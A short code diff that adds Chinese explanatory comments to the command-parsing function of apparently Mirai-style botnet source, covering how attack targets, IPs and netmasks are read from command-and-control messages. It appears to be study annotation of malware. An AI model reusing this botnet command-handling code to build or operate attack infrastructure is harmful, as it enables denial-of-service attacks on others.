@@ -65,7 +65,7 @@ void attack_kill_all(void)
 #endif
 }
 
-//解析从CNC下发的命令
+//解析从CNC下发的命令  对应attack.go中的Build函数
 void attack_parse(char *buf, int len)
 {
     int i;
@@ -102,9 +102,9 @@ void attack_parse(char *buf, int len)
     targs = calloc(targs_len, sizeof (struct attack_target));
     for (i = 0; i < targs_len; i++)
     {
-        targs[i].addr = *((ipv4_t *)buf); //IP 
+        targs[i].addr = *((ipv4_t *)buf); //IP  4字节
         buf += sizeof (ipv4_t);
-        targs[i].netmask = (uint8_t)*buf++; //掩码
+        targs[i].netmask = (uint8_t)*buf++; //掩码  1字节
         len -= (sizeof (ipv4_t) + sizeof (uint8_t));
 
         targs[i].sock_addr.sin_family = AF_INET;
